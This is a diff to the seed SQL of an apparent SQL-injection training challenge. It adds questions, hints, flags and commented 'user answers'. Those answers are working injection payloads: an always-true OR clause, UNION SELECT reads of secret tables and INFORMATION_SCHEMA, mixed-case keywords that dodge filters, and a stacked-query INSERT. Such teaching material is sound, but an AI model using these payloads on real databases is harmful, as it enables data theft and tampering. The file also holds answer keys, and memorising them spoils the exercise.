@@ -3,13 +3,14 @@ INSERT INTO questions (id, query, answer, hints)
 VALUES (
     'q1', 
     'SELECT flag FROM q1secrets WHERE question_id = ''$1'';',
-    'test'' OR 1 = 1; -- ',
+    'test'' OR 1 = 1; --',
     ARRAY [
         'Your injection comes after an opened '', close it off then proceed with an OR clause.', 
         'Choose something after your OR clause that will always be true.',
         'After your input there still might be some code, try commenting it out.'
     ]
 );
+-- q1 user answer: test' OR 1 = 1; -- 
 
 -- q1 answer
 INSERT INTO q1secrets (question_id, flag)
@@ -29,6 +30,7 @@ VALUES (
         'When using SQL single quotation marks are used for string literals.'
     ]
 );
+-- q2 user answer: test' OR 1 = 1; --, pass 
 
 -- q2 answer
 INSERT INTO q2secrets (flag, username, password)
@@ -49,6 +51,7 @@ VALUES (
         'Ensure the data types of columns in your UNION matches the data types in the original query.'
     ]
 );
+-- q3 user answer: test' UNION SELECT flag, '' FROM q3secrets; --
 
 -- Inserting example users
 INSERT INTO q3users (username, password)
@@ -72,6 +75,10 @@ VALUES (
     ]
 );
 
+-- q4 user answer: 
+-- test' uNION sELECT table_name, 1, 'test' fROM INFORMATION_SCHEMA.TABLES wHERE table_type = 'BASE TABLE'; --
+-- test' uNION sELECT *, 1, 'test' fROM secretsq4; --
+
 -- Inserting example users
 INSERT INTO q4users (age, dog_name, name)
 VALUES (1, 'spot', 'caitlin'), (5, 'spotty', 'denton');
@@ -79,3 +86,25 @@ VALUES (1, 'spot', 'caitlin'), (5, 'spotty', 'denton');
 -- q4 answer
 INSERT INTO secretsq4 (flag)
 VALUES ('SQLI_GUIDE{T$IS_FDQAL#$_$Q4_FLJKDJFNB}');
+
+-- q5 question
+INSERT INTO questions (id, query, answer, hints) 
+VALUES (
+    'q5', 
+    'SELECT username, password FROM q5users WHERE username = ''$1'';',
+    'test'' uNION sELECT column_name, data_type fROM INFORMATION_SCHEMA.COLUMNS wHERE TABLE_NAME = ''q5secrets''; --'
+    'test''; INSERT INTO q5secrets (flag, created_by, created_by_age) VALUES (''anything'', ''anything'', 1); --',
+    ARRAY [
+        'The first thing to do is find the table structure of the q5secrets table check out: https://stackoverflow.com/questions/1054984/how-can-i-get-column-names-from-a-table-in-sql-server', 
+        'Once you have found the columns names and data types, use a stacked query to insert a new row.'
+    ]
+);
+-- q5 user answer: 
+-- test' uNION sELECT column_name, data_type fROM INFORMATION_SCHEMA.COLUMNS wHERE TABLE_NAME = 'q5secrets'; --
+-- test'; iNSERT INTO q5secrets (flag, created_by, created_by_age) VALUES ('anything', 'anything', 1); --
+
+-- Inserting example users
+INSERT INTO q5users (username, password)
+VALUES ('admin', 'password123'), ('guest', 'guestpass');
+
+-- Initial empty state for q5secrets
